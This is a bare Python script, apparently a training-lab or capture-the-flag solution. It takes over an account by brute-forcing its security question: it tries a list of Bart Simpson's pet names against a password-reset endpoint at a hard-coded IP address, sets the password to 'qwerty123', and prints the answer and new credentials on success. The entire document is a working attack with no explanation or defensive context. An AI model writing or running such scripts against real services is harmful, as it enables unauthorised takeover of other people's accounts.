import json

import requests

s = requests.Session()
# https://en.wikipedia.org/wiki/Bart_Simpson
answers = ["Santa's Little Helper", "Strangles", "Stampy", "Duncan", "Chirpy Boy", "Bart Junior", "Lou"]
email = "Bart@kwike.mart"
password = "qwerty123"

for answer in answers:
    r = s.post(
        'http://43.241.202.47:3003/rest/user/reset-password',
        data=json.dumps({
            "email": email,
            "answer": answer,
            "new": password,
            "repeat": password}),
        headers={'Content-type': 'application/json'},
    )
    if r.status_code == 200:
        print("Answer:", answer)
        print("Email:", email)
        print("New Password:", password)
        break
